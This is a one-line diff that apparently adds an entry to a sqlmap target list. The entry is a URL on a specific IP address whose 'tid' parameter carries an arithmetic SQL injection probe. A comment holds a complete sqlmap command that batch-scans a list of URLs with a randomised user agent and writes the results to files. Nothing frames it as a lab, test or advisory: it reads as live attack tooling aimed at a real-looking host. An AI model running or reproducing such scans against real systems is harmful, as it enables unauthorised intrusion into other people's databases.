@@ -1,0 +1,1 @@
+https://8.210.166.211/source/article.php?act=search&tid=56/((6-4)*(2-1)-1)&ydh=987-65-4329 (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -m 03_sqlmap_urls.txt --batch --smart --random-agent --results-file sqlmap_collection_results.csv --output-dir sqlmap_output_collection
